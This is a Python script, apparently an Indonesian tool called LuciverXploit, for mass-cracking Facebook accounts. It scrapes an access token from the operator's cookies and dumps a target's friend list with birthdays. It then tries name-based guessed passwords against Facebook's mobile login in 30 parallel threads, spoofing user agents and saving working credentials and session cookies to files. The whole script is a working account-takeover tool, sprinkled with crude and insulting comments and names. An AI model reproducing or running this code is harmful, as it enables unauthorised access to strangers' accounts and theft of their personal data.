"""
LUCIVERXPLOIT BY CODER 
HARGAI AUTHOR NJING
BELAJAR LAH DULU
RUBAH DIKIT VIRUS NYEBAR

"""



M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')

import os
import sys
import re
import time
import calendar
import random
import subprocess
import base64
import zlib
import uuid
import json 
import datetime
from datetime import date, datetime
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor

import requests
from bs4 import BeautifulSoup as parser
from rich.panel import Panel
from rich.tree import Tree
from rich import print as DedeLuci_Punya_Ayah_LuciverXploit
from rich.console import Console as sol
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console
from rich import pretty




pretty.install()
CON=sol()
console = Console()
ses=requests.Session()
aplikasi_masih_aktif = []
aplikasi_tidak_aktif = []
luciver_xploit_official,ari_marshello_music = [],[]
hinaan_sia_motivasi = []
luci1,luci2,luci3,luci4,LuciverXprem,LuciverXnxx,uid,tokenku,akun,id,id2,ok,cp,loop = [],[],[],[],[],[],[],[],[],[],[],0,0,0




for LuciverXploit_Ganteng in range(9999):
    rc = random.choice; rr = random.randint
    Android_Version = str(rr(5,13))
    Chrome_Version = f"{str(rr(40,113))}.0.{str(rr(3000,5999))}.{str(rr(10,299))}"   
    Chrome_Version = f"{str(rr(40,113))}.0.{str(rr(3000,5999))}.{str(rr(10,299))}"    
    Crome_Version_Style = f"{str(rr(40,113))}.0.{str(rr(3000,5999))}.{str(rr(10,299))}"
    Crome_Version_Style = f"{str(rr(40,113))}.0.{str(rr(3000,5999))}.{str(rr(10,299))}"    
    BangLuci1 = f'Mozilla/5.0 (Linux; Android {Android_Version}; SM-N920) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{Chrome_Version} Mobile Safari/537.36'
    Bau_Memek=(f'{BangLuci1}')
    LuciverXprem.append(Bau_Memek)
    BangLuci2 = f'Mozilla/5.0 (Linux; Android {Android_Version}; M2012K11AG Build/L120G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{Chrome_Version} Mobile Safari/537.36'
    Bau_Memek=(f'{BangLuci2}')
    LuciverXprem.append(Bau_Memek)
    BangLuci3 = f'Mozilla/5.0 (Linux; Android {Android_Version}; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{Chrome_Version} Mobile Safari/537.36'
    Bau_Memek=(f'{BangLuci3}')
    LuciverXprem.append(Bau_Memek)
    BangLuci4 = f'Mozilla/5.0 (Linux; Android {Android_Version}; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{Chrome_Version} Mobile Safari/537.36'
    Bau_Memek=(f'{BangLuci4}')
    LuciverXprem.append(Bau_Memek)




dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.now().day
bln = dic[str(datetime.now().month)]
thn = datetime.now().year



luciver_ok = 'LUCI_OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
luciver_cp = 'LUCI_CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'




def ___Lucian_Putri_Adelia___():
	Hapus()
	DedeLuci_Punya_Ayah_LuciverXploit(f"""{H2}
 _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ 
|  |  |  _  |     |  |  |   __|  _  |     |   __| __  |     |     |  |  | {P2}
|     |     |   --|    -|   __|     |   --|   __| __ -|  |  |  |  |    -|
|__|__|__|__|_____|__|__|__|  |__|__|_____|_____|_____|_____|_____|__|__|                                                                       
""") 



def Dumping(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r                     {P}UID SEDANG DI KUMPULKAN {H}{len(id)}{P}{P}"),
			sys.stdout.flush()
		Dumping(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass          




def Setting_Dulu():
	for cape_euy in id:
		id2.insert(0,cape_euy)
	print('')
	DedeLuci_Punya_Ayah_LuciverXploit(f'     {P2}  APAKAH KAMU INGIN MELANJUTKA {H2}CRACK {P2}ATAU {M2}TIDAK{P2}? [{H2}Y{P2}/{M2}T{P2}]')
	____hinaan_Sia_Motivasi____ = console.input(f'                           {P2}TULIS : ')
	if ____hinaan_Sia_Motivasi____ in ['Y','y']:
		LuciverXnxx.append('async')
		print('')
	elif ____hinaan_Sia_Motivasi____ in ['']:
		DedeLuci_Punya_Ayah_LuciverXploit(f'{K} [{P}•{K}]{P} Pilih Yang Bener😡 ')
		Setting_Dulu()
	else:
		LuciverXnxx.append('async')
	Setting_Password_Uy()




def Setting_Password_Uy():
	global prog,des
	print('')
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as _luciana_putri_:
			for dasar_pericode in id2:
				idf,nmf = dasar_pericode.split('|')[0],dasar_pericode.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				aku_adalah_luciver_xploit_yang_ganteng = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						aku_adalah_luciver_xploit_yang_ganteng.append(frs+'123')
						aku_adalah_luciver_xploit_yang_ganteng.append(frs+'321')
						aku_adalah_luciver_xploit_yang_ganteng.append(frs+'1234')
						aku_adalah_luciver_xploit_yang_ganteng.append(frs+'123456')
						aku_adalah_luciver_xploit_yang_ganteng.append(frs+'ganteng') 
						aku_adalah_luciver_xploit_yang_ganteng.append(frs+'cantik') 
						aku_adalah_luciver_xploit_yang_ganteng.append(frs+'bangsat') 
						aku_adalah_luciver_xploit_yang_ganteng.append(frs+'katasandi') 
						aku_adalah_luciver_xploit_yang_ganteng.append(frs+'sayangku') 
						aku_adalah_luciver_xploit_yang_ganteng.append(frs+'palembang') 
						aku_adalah_luciver_xploit_yang_ganteng.append(frs+'bangsat123') 
						aku_adalah_luciver_xploit_yang_ganteng.append(frs+'bangka') 
				else:
					if len(frs)<3:
						aku_adalah_luciver_xploit_yang_ganteng.append(nmf)
					else:
						aku_adalah_luciver_xploit_yang_ganteng.append(nmf)
						aku_adalah_luciver_xploit_yang_ganteng.append(frs+'123')
						aku_adalah_luciver_xploit_yang_ganteng.append(frs+'1234')
						aku_adalah_luciver_xploit_yang_ganteng.append(frs+'12345')
				if 'ya' in luciver_xploit_official:
					for recode_aja in ari_marshello_music:
						aku_adalah_luciver_xploit_yang_ganteng.append(recode_aja)
				else:pass
				if 'async' in LuciverXnxx:
					_luciana_putri_.submit(Ricode_Terus,idf,aku_adalah_luciver_xploit_yang_ganteng,'m.prod.facebook.com')
				else:
					_luciana_putri_.submit(Ricode_Terus,idf,aku_adalah_luciver_xploit_yang_ganteng,'m.prod.facebook.com')
		print('') 
		DedeLuci_Punya_Ayah_LuciverXploit(f'     {P2}            HASIL : {H2}{luciver_ok}') 
		DedeLuci_Punya_Ayah_LuciverXploit(f'     {P2}            HASIL : {K2}{luciver_cp}')
		print('') 
		DedeLuci_Punya_Ayah_LuciverXploit(f'     {P2}                     OK : {H2}{ok}') 
		DedeLuci_Punya_Ayah_LuciverXploit(f'     {P2}                     CP :{K2} {cp}')
		print('')




def Ricode_Terus(idf,aku_adalah_luciver_xploit_yang_ganteng,url):
	global loop,ok,cp
	rr = random.randint
	Aing_Orang_Cilacap = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
	lucianaxd = random.choice(["Luciver✘","Xploit亗","Ganteng複","Bangetツ","Cilacap✘","RAL亗","Cyberツ","Team複","Indonesiaツ","BangLuci✘","OrangBaik亗","Tersakiti複","DihinaPericode✘"])
	prog.update(des,description=f'            {lucianaxd} {P2}{(loop)}/{len(id)} OK:{H2}{(ok)} {P2}CP:{K2}{(cp)}')
	prog.advance(des)
	ua = random.choice(LuciverXprem)
	ses = requests.Session()
	for pw in aku_adalah_luciver_xploit_yang_ganteng:
		pw = pw.lower()
		try:
			hencet = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=3446862972255280&kid_directed_site=0&app_id=3446862972255280&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&display=touch&locale=jv_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(hencet.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(hencet.text)).group(1),
'try_number': '0',
'unrecognized_tries': '0',
'email': idf,
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': 'false',
'had_password_prefilled': 'false',
'is_smart_lock': 'true',
'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(hencet.text)).group(1),
'pass': pw,
'jazoest': re.search('name="jazoest" value="(.*?)"',str(hencet.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(hencet.text)).group(1),
"__dyn": "",
"__csr": "",
"__a": "",
"__user": "0",
"_fb_noscript": "true"}
			head = {"Host": url,
"content-length": str(rr(2000,2199)),
"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
"sec-ch-ua-mobile": "?1",
"user-agent": ua,
"viewport-width": "360",
"content-type": "application/x-www-form-urlencoded",
"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(hencet.text)).group(1),
"sec-ch-ua-platform-version": f'"{str(rr(5,12))}.0.0"',
"x-asbd-id": "129477",
"x-requested-with": "com.android.chrome",
"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
"sec-ch-prefers-color-scheme": "light",
"sec-ch-ua-platform": '"Android"',
"accept": "*/*",
"origin": "https://"+url,
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"referer": f"https://{url}/login.php?skip_api_login=1&api_key=3446862972255280&kid_directed_site=0&app_id=3446862972255280&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&display=touch&locale=jv_ID&pl_dbl=0&refsrc=deprecated&_rdr",
"accept-encoding": "gzip, deflate, br",
"sec-websocket-version": str(rr(5,13)),
"accept-language": Aing_Orang_Cilacap}
			hehehe = ses.post(f'https://{url}/login/device-based/login/async/?api_key=3446862972255280&auth_token=f302da384cd8cc53013e453112408164&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&refsrc=deprecated&app_id=3446862972255280&cancel=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&lwv=100', headers=head, data=date, allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				tree = Tree(f"{K2}CHECKPOINT") 
				tree.add(f"{K2}{idf}").add(f"{K2}{pw}") 
				tree.add(f"{K2}{ua}\n") 
				DedeLuci_Punya_Ayah_LuciverXploit(tree)
				open('LUCI_CP/'+luciver_cp,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"{H2}SUKSES") 
				tree.add(f"{H2}{idf}").add(f"{H2}{pw}") 
				tree.add(f"{H2}{kuki}\n") 
				tree.add(f"{H2}{ua}\n") 
				DedeLuci_Punya_Ayah_LuciverXploit(tree)
				open('LUCI_OK/'+luciver_ok,'a').write(idf+'|'+pw+'\n')
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1




def Hapus():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass




def Kembali():
	Menu()



def Login():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], cookies={'cookie': cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            Menu(sy2, sy3)
        except KeyError:
            Luciana()
        except requests.exceptions.ConnectionError:
            print('[!] ConnectionError')
            exit()
    except IOError as e:
        Luciana()

def Luciana():
	try:
		os.system('clear')
		cok = {'cookie': input('Cookies : ')}
		link = ses.get('https://www.facebook.com/adsmanager/manage/campaigns' , cookies = cok).text
		gx = re.search("act=(.*?)&nav_source",str(link)).group(1)
		get = ses.get('https://www.facebook.com/adsmanager/manage/campaigns?act={}&nav_source=no_referrer'.format(gx), cookies = cok).text
		tok = re.search('accessToken="(.*?)"',str(get)).group(1)
		tokenw = open(".token.txt", "w").write(tok)
		cok = open(".cok.txt", "w").write(cok['cookie'])
		print('\nToken : {}'.format(tok))
		exit()
	except(Exception) as e:
		print(e)
		print('Cookies Mokad') ; time.sleep(3)
		Login()



def Menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('COOKIE KAMU KADALUARSA')
		time.sleep(5)
		Luciana()
	try:sh = requests.get('https://httpbin.org/ip').json()
	except:sh = {'origin':'-'}
	try:
		tglx = my_birthday.split('/')[1]
		blnx = dic2[str(my_birthday.split('/')[0])]
		thnx = my_birthday.split('/')[2]
		birth = tglx+' '+blnx+' '+thnx
	except:birth = '-'
	os.system('clear')
	___Lucian_Putri_Adelia___()



	DedeLuci_Punya_Ayah_LuciverXploit(f'            {P2}WELCOME TO{H2} {my_name} {P2}IN TOOLS LUCIVERXPLOIT') 
	DedeLuci_Punya_Ayah_LuciverXploit()
	DedeLuci_Punya_Ayah_LuciverXploit(f'                         {H2}1. {P2}CRACK FACEBOOK PUBLIK') 
	DedeLuci_Punya_Ayah_LuciverXploit(f'                         {H2}2. {P2}LAPOR KE AUTHOR') 
	DedeLuci_Punya_Ayah_LuciverXploit(f'                         {H2}3. {M2}KELUAR') 
	_Luciver_memang_hebat_ = console.input(f'                           {P2}PILIH  : ')
	if _Luciver_memang_hebat_ in ['01','1']: 
		DedeLuci_Punya_Ayah_LuciverXploit(f'                   {P2}SILAHKAN MASUKAN {H2}TARGET {P2}ANDA') 
		idt = console.input(f"\n                          {P2}TARGET UID : {H2}")  
		Dumping(idt,"",{"cookie":cok},token) 
		Setting_Dulu()
	elif _Luciver_memang_hebat_ in ['02','2']:
		Author()
	elif _Luciver_memang_hebat_ in ['03','3']:
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		DedeLuci_Punya_Ayah_LuciverXploit(f'{K2} [{P2}•{K2}]{P2} SUKSES MENGHAPUS COOKIE')
		time.sleep(3)
		exit()
	else:
		DedeLuci_Punya_Ayah_LuciverXploit(f'{M2}                     PILIH YANG BENER DONG!!')
		time.sleep(5)
		exit()
		
	
def Author():
	DedeLuci_Punya_Ayah_LuciverXploit(f'{P2}         TUNGGU SEBENTAR MENUJU GITHUB LUCIVERXPLOIT')
	time.sleep(3)
	os.system("xdg-open https://github.com/LuciverXploit")
	Kembali()




if __name__=='__main__':
	try:os.mkdir('LUCI_OK')
	except:pass
	try:os.mkdir('LUCI_CP')
	except:pass
	try:os.system('clear')
	except:pass 
	Login()